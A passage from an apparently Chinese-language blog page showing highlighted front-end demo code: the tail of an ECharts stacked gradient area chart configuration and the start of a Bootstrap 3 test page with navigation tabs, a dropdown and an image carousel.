class=\"attr\">opacity</span>: <span class=\"number\">0.8</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">color</span>: <span class=\"keyword\">new</span> echarts.<span class=\"property\">graphic</span>.<span class=\"title class_\">LinearGradient</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, [</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(0, 221, 255)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">1</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(77, 119, 255)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        ])</span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">emphasis</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">focus</span>: <span class=\"string\">&#x27;series&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">data</span>: [<span class=\"number\">120</span>, <span class=\"number\">282</span>, <span class=\"number\">111</span>, <span class=\"number\">234</span>, <span class=\"number\">220</span>, <span class=\"number\">340</span>, <span class=\"number\">310</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">name</span>: <span class=\"string\">&#x27;Line 3&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;line&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">stack</span>: <span class=\"string\">&#x27;Total&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">smooth</span>: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">lineStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">width</span>: <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">showSymbol</span>: <span class=\"literal\">false</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">areaStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">opacity</span>: <span class=\"number\">0.8</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">color</span>: <span class=\"keyword\">new</span> echarts.<span class=\"property\">graphic</span>.<span class=\"title class_\">LinearGradient</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, [</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(55, 162, 255)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">1</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(116, 21, 219)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        ])</span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">emphasis</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">focus</span>: <span class=\"string\">&#x27;series&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">data</span>: [<span class=\"number\">320</span>, <span class=\"number\">132</span>, <span class=\"number\">201</span>, <span class=\"number\">334</span>, <span class=\"number\">190</span>, <span class=\"number\">130</span>, <span class=\"number\">220</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">name</span>: <span class=\"string\">&#x27;Line 4&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;line&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">stack</span>: <span class=\"string\">&#x27;Total&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">smooth</span>: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">lineStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">width</span>: <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">showSymbol</span>: <span class=\"literal\">false</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">areaStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">opacity</span>: <span class=\"number\">0.8</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">color</span>: <span class=\"keyword\">new</span> echarts.<span class=\"property\">graphic</span>.<span class=\"title class_\">LinearGradient</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, [</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(255, 0, 135)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">1</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(135, 0, 157)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        ])</span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">emphasis</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">focus</span>: <span class=\"string\">&#x27;series&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">data</span>: [<span class=\"number\">220</span>, <span class=\"number\">402</span>, <span class=\"number\">231</span>, <span class=\"number\">134</span>, <span class=\"number\">190</span>, <span class=\"number\">230</span>, <span class=\"number\">120</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">name</span>: <span class=\"string\">&#x27;Line 5&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">type</span>: <span class=\"string\">&#x27;line&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">stack</span>: <span class=\"string\">&#x27;Total&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">smooth</span>: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">lineStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">width</span>: <span class=\"number\">0</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">showSymbol</span>: <span class=\"literal\">false</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">label</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">show</span>: <span class=\"literal\">true</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">position</span>: <span class=\"string\">&#x27;top&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">areaStyle</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">opacity</span>: <span class=\"number\">0.8</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">color</span>: <span class=\"keyword\">new</span> echarts.<span class=\"property\">graphic</span>.<span class=\"title class_\">LinearGradient</span>(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, [</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(255, 191, 0)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">offset</span>: <span class=\"number\">1</span>,</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"attr\">color</span>: <span class=\"string\">&#x27;rgb(224, 62, 76)&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">          &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        ])</span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">emphasis</span>: &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"attr\">focus</span>: <span class=\"string\">&#x27;series&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">      &#125;,</span></span><br><span class=\"line\"><span class=\"language-javascript\">      <span class=\"attr\">data</span>: [<span class=\"number\">220</span>, <span class=\"number\">302</span>, <span class=\"number\">181</span>, <span class=\"number\">234</span>, <span class=\"number\">210</span>, <span class=\"number\">290</span>, <span class=\"number\">150</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  ]</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t<span class=\"comment\">/*option = &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            title: &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">                text: &#x27;ECharts 入门示例&#x27;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            &#125;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            tooltip: &#123;&#125;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            legend: &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">                data:[&#x27;销量&#x27;]</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            &#125;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            xAxis: &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">                data: [&quot;衬衫&quot;,&quot;羊毛衫&quot;,&quot;雪纺衫&quot;,&quot;裤子&quot;,&quot;高跟鞋&quot;,&quot;袜子&quot;]</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            &#125;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            yAxis: &#123;&#125;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            series: [&#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">                name: &#x27;销量&#x27;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">                type: &#x27;bar&#x27;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">                data: [5, 20, 36, 10, 10, 20]</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">            &#125;]</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">        &#125;; */</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"comment\">// 使用刚指定的配置项和数据显示图表。</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        myChart.<span class=\"title function_\">setOption</span>(option);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"bootstraptest-html\"><a href=\"#bootstraptest-html\" class=\"headerlink\" title=\"bootstraptest.html\"></a>bootstraptest.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.0.1/css/bootstrap.min.css&quot;</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;container&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;row clearfix&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-3 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;140x140&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://cdn.ibootstrap.cn/lorempixel.com/140/140/default.jpg&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;img-circle&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-9 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\th3. 这是一套可视化布局系统.</span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;row clearfix&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-12 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;nav nav-tabs&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;active&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>首页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>简介<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;disabled&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>信息<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;dropdown pull-right&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span> <span class=\"attr\">data-toggle</span>=<span class=\"string\">&quot;dropdown&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;dropdown-toggle&quot;</span>&gt;</span>下拉<span class=\"tag\">&lt;<span class=\"name\">strong</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;caret&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">strong</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;dropdown-menu&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>操作<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>设置栏目<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>更多设置<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;divider&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span>&gt;</span>分割线<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;row clearfix&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;col-md-12 column&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel slide&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;carousel-449328&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ol</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-indicators&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;active&quot;</span> <span class=\"attr\">data-slide-to</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">data-target</span>=<span class=\"string\">&quot;#carousel-449328&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">data-slide-to</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">data-target</span>=<span class=\"string\">&quot;#carousel-449328&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">data-slide-to</span>=<span class=\"string\">&quot;2&quot;</span> <span class=\"attr\">data-target</span>=<span class=\"string\">&quot;#carousel-449328&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-inner&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item active&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://cdn.ibootstrap.cn/lorempixel.com/1600/500/sports/1/default.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-caption&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tFirst Thumbnail label</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tCras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">alt</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://cdn.ibootstrap.cn/lorempixel.com/1600/500/sports/2/default.jpg&quot;</span> /&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;carousel-caption&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tSecond Thumbnail label</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\tCras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t<span class=\"tag\">&lt;/<span 